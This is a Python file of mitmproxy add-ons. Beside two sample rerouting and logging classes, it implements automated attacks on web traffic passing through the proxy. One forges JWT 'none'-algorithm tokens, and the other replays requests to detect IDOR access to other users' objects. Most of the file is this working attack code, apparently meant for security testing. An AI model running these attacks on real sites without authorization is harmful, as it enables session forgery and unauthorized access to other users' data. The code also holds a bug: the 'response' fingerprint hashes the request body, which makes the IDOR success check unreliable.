import json
from mitmproxy import http
from helpers import *
import json, hashlib


class RerouteAgent:
    # sample add-on that reroutes the request or stops it according to certain rules
    def request(self, flow: http.HTTPFlow):
        # redirect to different host
        if flow.request.pretty_host == "google.com":
            flow.request.host = "mitmproxy.org"
        # answer from proxy
        elif flow.request.path.endswith("/brew"):
            flow.response = http.Response.make(
                418, b"I'm a teapot",
            )


class RequestLogger:
    # sample add-on that prints the request passing through
    def request(self, flow: http.HTTPFlow):
        print(flow.request)


class JWTNoneAlgAttack:
    BENCHMARK_LABEL = 'JWT_NONE_ALG_BENCHMARK' # label for the benchmark failing flow
    ATTACK_LABEL = 'JWT_NONE_ALG_ATTACK' # label for the attack flow

    def request(self, flow: http.HTTPFlow):
        if get_jwt(flow.request.cookies) is None:
            return # No JWT token
        
        if flow.request.path.find('socket.io') != -1:
            return # socket.io request
        
        if not hasattr(flow, 'label'):
            benchmark_flow = flow.copy()
            benchmark_flow.label = self.BENCHMARK_LABEL
            benchmark_flow.request.headers.pop('Authorization', None)
            benchmark_flow.request.cookies['token'] = generate_none_token_with_signature(get_jwt(flow.request.cookies))
            replay_flow(benchmark_flow)


    def response(self, flow: http.HTTPFlow):
        if get_jwt(flow.request.cookies) is None:
            return # No JWT token
        
        if flow.request.path.find('socket.io') != -1:
            return # socket.io request

        if not hasattr(flow, 'label'):
            return # No label attribute (not a replayed request i.e. original request)
        
        if flow.label == self.BENCHMARK_LABEL:
            attack_flow = flow.copy()
            attack_flow.label = self.ATTACK_LABEL
            attack_flow.benchmark_hash = hash(flow.response.text)
            attack_flow.request.headers.pop('Authorization', None)
            attack_flow.request.cookies['token'] = drop_token_signature(get_jwt(flow.request.cookies))
            replay_flow(attack_flow)
        elif flow.label == self.ATTACK_LABEL:    
            if flow.benchmark_hash != hash(flow.response.text):
                print_attack_success(self.ATTACK_LABEL, flow)
                print(dir(flow.request))
                report_attack(self.ATTACK_LABEL, flow)
            else:
                pass # attack failed
        else:
            pass # not a replayed request


class IdorAttack:
    ATTACK_LABEL = 'IDOR'
    user_endpoints_map = {}

    def is_identifier(self, content):
        try:
            int(content)
            return True
        except:
            return False


    def get_request_token(self, flow: http.HTTPFlow):
        if len(flow.request.path_components) and not self.is_identifier(flow.request.path_components[-1]):
            return
        return '/'.join(flow.request.path_components[:-1])
    

    def get_user_session_fingerprint(self, flow: http.HTTPFlow):
        cookies_serialized = json.dumps(dict(flow.request.cookies))
        return hashlib.md5(cookies_serialized.encode('utf-8')).hexdigest()
    

    def get_response_fingerprint(self, flow: http.HTTPFlow):
        if flow.request.text:
            return hashlib.md5(flow.request.text.encode('utf-8')).hexdigest()
        return None


    def add_endpoint_tracking(self, flow: http.HTTPFlow, request_token):
        request_path_object = self.user_endpoints_map.get(request_token)
        
        if not request_path_object:
            self.user_endpoints_map[request_token] = {
                'ignore_path': False,
                'sub_paths': {
                    flow.request.path: {
                        'flow': flow,
                        'owner': self.get_user_session_fingerprint(flow),
                    },
                },
            }
            return
        
        if request_path_object['ignore_path']:
            return

        if not request_path_object['sub_paths'].get(flow.request.path):
            request_path_object['sub_paths'][flow.request.path] = {
                'flow': flow,
                'owner': self.get_user_session_fingerprint(flow)
            }
            
            if len(request_path_object['sub_paths'].keys()) > 2:
                request_path_object['ignore_path'] = True
            return
        
        if request_path_object['sub_paths'][flow.request.path]['owner'] != self.get_user_session_fingerprint(flow):
            request_path_object['ignore_path'] = True


    def is_idor_possible(self, request_token):
        if self.user_endpoints_map.get(request_token)['ignore_path']:
            return False
        
        paths = self.user_endpoints_map.get(request_token)['sub_paths']
        # print("___________TESTING: ", request_token, paths.keys())
        return len(paths.keys()) == 2 and len(set(obj['owner'] for obj in paths.values())) == 2


    def is_attack_successful(self, flow: http.HTTPFlow):
        return self.get_response_fingerprint(flow) == flow.TARGET_RESP_FINGERPRINT


    def request(self, flow: http.HTTPFlow):
        if hasattr(flow.request, 'ignore'):
            return
        # print(self.get_user_session_fingerprint(flow), '|', is_request_in_scope(flow), '|', flow.request)


    def response(self, flow: http.HTTPFlow):
        if hasattr(flow, 'label'):
            if flow.label == self.ATTACK_LABEL and self.is_attack_successful(flow):
                print_attack_success(self.ATTACK_LABEL, flow)
                report_attack(self.ATTACK_LABEL, flow)
            return
        
        request_token = self.get_request_token(flow)

        if not is_request_in_scope(flow) or not request_token:
            return

        self.add_endpoint_tracking(flow, request_token)
        # print(self.user_endpoints_map)

        if self.is_idor_possible(request_token):
            # test idor here
            # print('********** IDOR possible in: ', request_token)
            
            other_path_obj = [
                path_obj for path_obj
                in self.user_endpoints_map.get(request_token)['sub_paths'].items()
                if path_obj[0] != flow.request.path
            ][0][1]
            
            # print('_____sibling:', other_path_obj)
            
            target_flow = other_path_obj['flow']
            attack_flow = flow.copy()
            attack_flow.label = self.ATTACK_LABEL
            attack_flow.TARGET_RESP_FINGERPRINT = self.get_response_fingerprint(target_flow)
            replay_flow(attack_flow)
